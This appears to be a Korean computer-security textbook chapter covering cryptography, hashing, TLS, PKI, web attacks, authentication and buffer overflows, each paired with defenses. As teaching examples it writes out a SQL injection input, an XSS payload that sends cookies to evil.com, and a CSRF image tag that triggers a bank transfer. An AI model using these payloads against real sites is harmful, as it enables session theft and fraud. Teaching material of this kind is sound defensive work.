## 1. 출발점: 보안의 세 기둥

### 1.1 CIA 삼각형 — 보안이란 무엇인가

```
🔴 [정의] CIA Triad:

  기밀성 (Confidentiality): 인가된 사람만 정보에 접근 가능
    "내 메시지를 제3자가 읽지 못한다"
    도구: 암호화

  무결성 (Integrity): 정보가 변조되지 않았음을 보장
    "받은 메시지가 원본과 동일하다"
    도구: 해시, 디지털 서명, MAC

  가용성 (Availability): 필요할 때 정보에 접근 가능
    "서비스가 정상적으로 작동한다"
    위협: DDoS 공격

이 세 가지가 왜 동시에 필요한가:
  기밀성만: 메시지가 변조되어도 모름
  무결성만: 누구나 읽을 수 있음
  가용성만: 비밀이 보호되지 않고, 변조도 가능
  → 셋이 함께 있어야 "안전하다"고 말할 수 있다.
```

## 2. 대칭키 암호 — "같은 열쇠로 잠그고 열기"

### 2.1 원리 — 왜 "대칭"인가

```
🔴 [정의] 대칭키 암호: 암호화와 복호화에 같은 키를 사용.

  평문 + 키 → [암호화] → 암호문
  암호문 + 같은 키 → [복호화] → 평문

  비유: 자물쇠와 열쇠. 잠그는 열쇠 = 여는 열쇠.

장점: 빠르다! (비대칭키의 100~1000배)
단점: 키 분배 문제 — 어떻게 안전하게 키를 전달하는가?
  만나서 직접 전달? → 비현실적 (인터넷에서)
  네트워크로 전달? → 도청되면 끝
  → 이 문제를 해결한 것이 비대칭키 암호(§3)
```

### 2.2 AES — 현대 표준

```
🔴 AES (Advanced Encryption Standard):
  128/192/256비트 키. 블록 크기 128비트.
  현재 가장 널리 사용되는 대칭키 암호.

  왜 AES가 표준인가:
    DES(56비트)가 키 길이 부족으로 깨진 후, 공개 경쟁으로 선정.
    수학적으로 안전하고, 하드웨어 가속 지원(AES-NI).

🔴 운용 모드 — 왜 여러 가지인가:
  AES는 128비트 블록을 암호화. 그 이상의 데이터는 어떻게?

  ECB (Electronic Codebook): 각 블록을 독립적으로 암호화.
    문제: 같은 블록 → 같은 암호문 → 패턴 노출!
    유명한 예: ECB로 암호화한 이미지 → 원본의 윤곽이 보인다!
    → 절대 사용하지 마라.

  CBC (Cipher Block Chaining): 이전 암호문 블록을 다음에 XOR.
    → 같은 블록이어도 다른 암호문 → 패턴 숨김.
    단점: 순차적이라 병렬화 불가.

  CTR (Counter): 카운터 값을 암호화하여 키 스트림 생성 → 평문과 XOR.
    → 병렬화 가능! 빠름.

  GCM (Galois/Counter Mode): CTR + 인증(MAC)
    → 암호화 + 무결성을 동시에! 현대 TLS의 표준.
    → "인증된 암호화(authenticated encryption)"
```

## 3. 비대칭키 암호 — "다른 열쇠로 잠그고 열기"

### 3.1 핵심 아이디어 — 왜 이것이 혁명적인가

```
🔴 [원리] 비대칭키 (공개키) 암호:
  공개키(public key): 누구나 알아도 됨 → 암호화에 사용
  개인키(private key): 나만 알아야 함 → 복호화에 사용

  누구든 공개키로 암호화할 수 있지만, 개인키를 가진 사람만 복호화 가능.

왜 혁명적인가:
  키 분배 문제가 해결된다!
  공개키는 인터넷에 올려도 안전 → 모르는 사람과도 안전한 통신 가능.
  → 인터넷 상거래, 이메일 보안, HTTPS의 기반.

수학적 기반 (Ch.05에서 상세):
  RSA: 큰 수의 소인수분해가 어렵다
  ECC: 타원 곡선 위의 이산 로그가 어렵다
  DH: 모듈러 지수의 이산 로그가 어렵다

  모두 "한 방향은 쉽고, 역방향은 어려운" 수학적 문제에 의존.
```

### 3.2 RSA — 구조 요약 (Ch.05에서 유도 완료)

```
  키 생성: p, q 소수 → n = pq, φ(n) = (p-1)(q-1), e·d ≡ 1 (mod φ(n))
  공개키: (n, e), 개인키: (n, d)
  암호화: c = m^e mod n
  복호화: m = c^d mod n

  왜 안전한가: n에서 p, q를 찾는 것(소인수분해)이 현실적으로 불가능.
  
  키 크기: 현재 최소 2048비트 권장 (2048비트 RSA ≈ 112비트 대칭키 보안)
  
  왜 대칭키보다 느린가:
    모듈러 거듭제곱 = 수천 비트 곱셈의 반복
    AES = 비트 연산과 테이블 참조
    → RSA가 100~1000배 느림
    → 실전: RSA로 대칭키를 교환하고, 대칭키(AES)로 데이터를 암호화
```

### 3.3 Diffie-Hellman — 키 교환 (Ch.05에서 상세)

```
🔴 두 사람이 비밀 채널 없이 공유 비밀을 만드는 프로토콜.

  앨리스: a 비밀, A = g^a mod p 공개
  밥:     b 비밀, B = g^b mod p 공개
  공유 비밀: K = g^(ab) mod p (둘 다 계산 가능)
  
  도청자: g, p, A, B를 알지만 a, b를 구하려면 이산 로그 필요 → 어렵다!

🔵 TLS 핸드셰이크에서 핵심적으로 사용됨.
  현대: ECDHE (타원 곡선 DH, 임시 키) → 순방향 비밀성 보장.
```

## 4. 해시 함수 — "디지털 지문"

### 4.1 해시 함수란 — 왜 "일방향"인가

```
🔴 [정의] 암호학적 해시 함수:
  임의 길이 입력 → 고정 길이 출력 (예: SHA-256 → 256비트)

필요한 성질:
  (1) 역상 저항 (Pre-image resistance): 출력에서 입력을 역추적 불가
  (2) 제2 역상 저항: 같은 해시를 만드는 다른 입력을 찾기 어려움
  (3) 충돌 저항 (Collision resistance): H(x) = H(y)인 x ≠ y를 찾기 어려움
  (4) 눈사태 효과: 입력이 1비트 바뀌면 출력의 ~50%가 변함

왜 "일방향"인가:
  해시는 정보를 압축한다 (무한→고정 길이).
  → 정보가 소실된다 → 역추적이 "구조적으로" 불가능.
  → 비둘기집 원리에 의해 충돌은 반드시 존재하지만, 찾기가 어렵다.

주요 해시 함수:
  MD5: 128비트, 깨짐 → 보안 용도로 사용 금지
  SHA-1: 160비트, 깨짐 → 보안 용도로 사용 금지
  SHA-256: 256비트, 현재 안전 → 가장 널리 사용
  SHA-3: 256비트, 다른 구조 → SHA-2의 대안

🔵 [CS 연결]
  Git: 커밋, 파일의 식별자 = SHA-1 해시
  블록체인: 블록 연결 = 이전 블록의 해시를 포함
  무결성 검증: 파일 다운로드 후 해시 비교
```

### 4.2 비밀번호 해싱 — 왜 평문 저장이 위험한가

```
비밀번호를 평문으로 저장하면:
  DB 유출 시 모든 비밀번호가 노출!

해시로 저장:
  DB에는 H(password)만 저장. 원본 복원 불가.
  로그인 시: 입력 비밀번호의 해시와 DB의 해시를 비교.

🔴 그런데 단순 해시로는 부족한 이유:
  레인보우 테이블: 흔한 비밀번호의 해시를 미리 계산해둔 표
    "password123" → 해시값을 미리 알고 있으면 역추적 가능!

  해결: 솔트(salt) + 느린 해시
    salt = 사용자마다 다른 랜덤 값
    저장: salt + H(salt + password)
    → 같은 비밀번호도 다른 해시 → 레인보우 테이블 무용화
    
    느린 해시: bcrypt, scrypt, Argon2
    왜 느려야 하는가: 공격자의 무차별 대입(brute-force)을 느리게 만든다.
    정상 사용: 로그인 시 1회 → 0.1초 느린 것은 무관
    공격자: 수십억 번 시도 → 0.1초 × 10⁹ = 실질적으로 불가능
```

## 5. 디지털 서명 — "이 메시지는 내가 보냈다"

```
🔴 [원리] 비대칭키의 역방향 사용:
  개인키로 서명 → 공개키로 검증

  서명 과정:
    1. 메시지의 해시를 구한다: h = H(message)
    2. 해시를 개인키로 암호화: signature = h^d mod n
    3. 메시지 + 서명을 전송

  검증 과정:
    1. 서명을 공개키로 복호화: h' = signature^e mod n
    2. 메시지의 해시를 직접 계산: h = H(message)
    3. h == h'이면 → 서명 유효!

  왜 해시를 서명하는가:
    메시지 전체를 RSA로 서명하면 매우 느림 (RSA가 느리니까).
    해시(256비트)만 서명하면 빠르다. 해시가 메시지를 대표하므로 OK.

제공하는 보장:
  인증: 개인키 소유자만 서명 가능 → "이 사람이 보냈다"
  무결성: 메시지가 변경되면 해시가 달라져 서명 검증 실패
  부인 방지: 개인키 소유자만 서명할 수 있으므로 "나는 보내지 않았다"고 부인 불가
```

## 6. TLS — 인터넷 보안의 기반

### 6.1 TLS 핸드셰이크 — 왜 이 과정이 필요한가

```
🔴 TLS (Transport Layer Security):
  HTTPS = HTTP + TLS. 웹 통신 보안의 핵심.

핸드셰이크 과정 (TLS 1.3 간략):

  클라이언트                              서버
      │                                    │
      │─── ClientHello ───────────────→│     지원하는 암호 목록, 랜덤값
      │                                    │
      │←── ServerHello + 인증서 ────────│     선택한 암호, 서버 인증서
      │                                    │
      │     인증서 검증 (CA 체인 확인)         │
      │     키 교환 (ECDHE)                  │
      │                                    │
      │─── Finished ──────────────────→│     대칭키 합의 완료
      │←── Finished ──────────────────│     
      │                                    │
      │←─── 암호화된 통신 (AES-GCM) ──→│     이후 모든 데이터는 암호화

왜 이 과정이 필요한가:
  (1) 서버 인증: "이 서버가 진짜 google.com인가?" → 인증서 검증
  (2) 키 교환: 대칭키를 안전하게 합의 → DH/ECDHE
  (3) 암호화: 합의된 대칭키로 AES 통신 → 도청 방지

  비대칭키 = 키 교환과 인증에만 사용 (느리니까)
  대칭키 = 실제 데이터 암호화에 사용 (빠르니까)
  → 두 암호 체계의 장점을 조합
```

### 6.2 PKI와 인증서 — 왜 CA가 필요한가

```
🔴 문제: 공개키가 정말 상대방의 것인가?
  중간자 공격(MITM): 공격자가 자기 공개키를 상대의 것으로 속일 수 있다!

해결: 인증 기관 (CA, Certificate Authority)
  CA = "이 공개키가 진짜 google.com의 것임을 보증합니다"
  
  인증서 = (도메인, 공개키, CA의 디지털 서명)
  
  브라우저가 CA의 공개키를 미리 가지고 있음 (루트 인증서)
  → CA의 서명을 검증 → 서버의 공개키를 신뢰

  인증서 체인:
    루트 CA → 중간 CA → 서버 인증서
    브라우저는 루트 CA만 신뢰 → 체인을 따라 검증
    
  왜 체인 구조인가:
    루트 CA의 개인키가 극도로 중요 → 오프라인 보관.
    일상적 서명은 중간 CA가 수행.
    중간 CA가 뚫려도 루트 CA는 안전 → 피해 범위 제한.
```

## 7. 웹 보안 — 가장 흔한 공격과 방어

### 7.1 SQL Injection — 왜 발생하는가

```
🔴 [공격] 사용자 입력이 SQL 쿼리의 일부로 해석되는 취약점.

  코드: query = "SELECT * FROM users WHERE name = '" + input + "'"
  
  정상 입력: input = "alice"
  → SELECT * FROM users WHERE name = 'alice'  ✓

  악성 입력: input = "' OR '1'='1"
  → SELECT * FROM users WHERE name = '' OR '1'='1'
  → '1'='1'은 항상 참 → 모든 사용자 데이터 유출!

왜 발생하는가:
  데이터(사용자 입력)와 코드(SQL 명령)가 구분되지 않기 때문.
  입력이 "데이터"로만 취급되어야 하는데 "코드"로 해석된다.

🔴 [방어] Prepared Statement (매개변수화된 쿼리):
  query = "SELECT * FROM users WHERE name = ?"
  execute(query, [input])
  
  → input이 무엇이든 "데이터"로만 취급됨. SQL 코드로 해석되지 않음.
  → 근본적 해결.
```

### 7.2 XSS — 왜 발생하는가

```
🔴 [공격] XSS (Cross-Site Scripting):
  공격자의 스크립트가 피해자의 브라우저에서 실행되는 취약점.

  예: 게시판에 악성 코드 삽입
    게시글 내용: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
    → 다른 사용자가 이 게시글을 보면 → 스크립트 실행 → 쿠키(세션) 탈취!

왜 발생하는가:
  SQL Injection과 같은 원리 — 데이터와 코드의 경계가 모호.
  사용자 입력이 HTML 안에 그대로 삽입되면, 브라우저가 "코드"로 해석.

🔴 [방어]
  출력 이스케이핑: < → &lt;, > → &gt; → 브라우저가 태그로 해석하지 않음
  CSP (Content Security Policy): 허용된 스크립트 출처만 실행
  HttpOnly 쿠키: 자바스크립트에서 쿠키 접근 불가
```

### 7.3 CSRF — 왜 발생하는가

```
🔴 [공격] CSRF (Cross-Site Request Forgery):
  피해자의 브라우저가 공격자가 의도한 요청을 자동으로 보내게 하는 공격.

  시나리오:
    피해자가 은행에 로그인한 상태.
    악성 사이트 방문 → 숨겨진 이미지: <img src="https://bank.com/transfer?to=attacker&amount=1000">
    → 브라우저가 은행 쿠키를 자동 첨부하여 요청 → 송금 실행!

왜 발생하는가:
  브라우저가 쿠키를 자동으로 전송하기 때문.
  서버는 "이 요청이 사용자의 의도인가, 악성 사이트의 의도인가"를 구분 못 함.

🔴 [방어]
  CSRF 토큰: 서버가 폼에 랜덤 토큰 삽입 → 요청 시 토큰 검증
    → 악성 사이트는 이 토큰을 모르므로 위조 불가
  SameSite 쿠키: 다른 사이트에서의 요청에 쿠키 미첨부
```

### 7.4 보안의 공통 원리

```
🔴 SQL Injection, XSS, CSRF의 공통점:

  "신뢰할 수 없는 입력을 검증/격리 없이 사용하면 위험하다"
  
  SQL Injection: 입력이 SQL 코드로 해석됨
  XSS: 입력이 HTML/JS 코드로 해석됨
  CSRF: 요청이 사용자 의도인지 검증 안 함

  근본 원칙: 절대 사용자 입력을 신뢰하지 마라.
    - 입력 검증 (validation)
    - 출력 이스케이핑 (escaping)
    - 매개변수화 (parameterization)
    - 최소 권한 원칙 (principle of least privilege)
```

## 8. 인증과 접근 제어

### 8.1 인증 (Authentication) — "당신이 누구인가"

```
🔴 세 가지 인증 요소:
  (1) 지식 (Something you know): 비밀번호, PIN
  (2) 소유 (Something you have): 스마트폰(OTP), 보안 키
  (3) 생체 (Something you are): 지문, 얼굴, 홍채

  MFA (Multi-Factor Authentication): 2개 이상의 요소를 결합.
    비밀번호 + OTP = "알고 있는 것 + 가지고 있는 것"
    → 하나가 뚫려도 나머지로 보호.
```

### 8.2 토큰 기반 인증 — 왜 세션 대신 토큰인가

```
세션 기반: 서버가 세션 ID를 저장 → 상태 유지 필요 → 서버 확장이 어려움
토큰 기반 (JWT): 토큰 자체에 정보를 담음 → 서버 무상태(stateless) → 확장 용이

🔴 JWT (JSON Web Token):
  Header.Payload.Signature
  
  Header:  {"alg": "HS256", "typ": "JWT"}
  Payload: {"sub": "user123", "exp": 1234567890}
  Signature: HMAC(header + payload, secret_key)

  서버는 비밀키로 서명을 검증 → 토큰이 위조되지 않았음을 확인.
  서버에 세션을 저장할 필요 없음 → 수평 확장 가능.

🔴 OAuth 2.0:
  "제3자 서비스에 내 정보 접근 권한을 안전하게 부여"
  예: "Google로 로그인" → Google이 인증, 앱은 권한만 받음
  → 앱에 비밀번호를 주지 않고도 제한된 접근을 허용.
```

### 8.3 접근 제어 모델

```
🔴 주요 모델:
  DAC (Discretionary): 소유자가 권한을 결정. Unix 파일 권한(rwx).
  MAC (Mandatory): 시스템이 보안 등급으로 강제. 군사/정부.
  RBAC (Role-Based): 역할에 권한 부여, 사용자에 역할 할당.
    예: "관리자" 역할 → 모든 권한, "사용자" 역할 → 읽기만
  ABAC (Attribute-Based): 속성(시간, 위치, 부서 등) 기반 세밀한 제어.
    예: "근무 시간에 사무실에서만 접근 가능"
```

## 9. 시스템 보안 — 하드웨어와 OS 수준의 위협

### 9.1 버퍼 오버플로 — 왜 C 코드가 위험한가

```
🔴 [공격] 버퍼 오버플로 (Buffer Overflow):
  고정 크기 버퍼에 더 많은 데이터를 쓰면 인접 메모리를 덮어쓴다.

  스택:
  ┌──────────────┐ 높은 주소
  │  반환 주소     │ ← 이것을 덮어쓰면 함수 리턴 시 공격자 코드로 점프!
  ├──────────────┤
  │  저장된 EBP   │
  ├──────────────┤
  │  버퍼[64]     │ ← 여기에 100바이트를 쓰면?
  └──────────────┘ 낮은 주소
  
  → 반환 주소가 덮어씌워져 공격자의 코드가 실행됨!

왜 발생하는가:
  C/C++은 배열 경계 검사를 하지 않는다.
  gets(), strcpy() 같은 함수는 입력 길이를 확인하지 않는다.
  → 입력이 버퍼보다 크면 → 인접 메모리를 덮어씀 → 제어 흐름 장악.

🔴 [방어]
  Stack Canary: 반환 주소 앞에 랜덤 값을 놓고, 리턴 전에 확인.
    값이 변했으면 → 오버플로 감지 → 프로그램 종료.
  ASLR: 메모리 주소를 랜덤화 → 공격자가 점프할 주소를 예측 불가.
  DEP/NX: 스택/힙의 데이터를 실행 불가로 표시 → 코드 삽입 실행 방지.
  안전한 언어: Rust, Go, Java — 메모리 안전성을 언어 차원에서 보장.
```

## 11. 정리

```
[원리 1] CIA: 기밀성·무결성·가용성 — 보안의 세 기둥.
[원리 2] 대칭키: 같은 키로 암호화/복호화. 빠르지만 키 분배가 문제.
[원리 3] 비대칭키: 공개키/개인키 쌍. 키 분배 해결. 느리지만 인증과 서명에 필수.
[원리 4] 실전: 비대칭으로 키 교환 → 대칭으로 데이터 암호화 (TLS의 구조).
[원리 5] 해시 = 디지털 지문. 일방향. 비밀번호 저장, 무결성 검증.
[원리 6] "사용자 입력을 절대 신뢰하지 마라" — SQL Injection, XSS, CSRF의 공통 교훈.
[원리 7] 깊이 있는 방어 (Defense in Depth): 하나의 방어가 뚫려도 다음 계층이 보호.

외워야 할 것:
  🔴 CIA 삼각형
  🔴 대칭키 vs 비대칭키의 차이와 사용 사례
  🔴 AES 운용 모드 (ECB 안 됨, GCM 추천)
  🔴 TLS 핸드셰이크 흐름
  🔴 해시의 필수 성질 (역상 저항, 충돌 저항, 눈사태)
  🔴 비밀번호: salt + 느린 해시 (bcrypt/Argon2)
  🔴 SQL Injection → Prepared Statement
  🔴 XSS → 출력 이스케이핑 + CSP
  🔴 CSRF → CSRF 토큰 + SameSite
  🔴 버퍼 오버플로 → Canary, ASLR, DEP
```
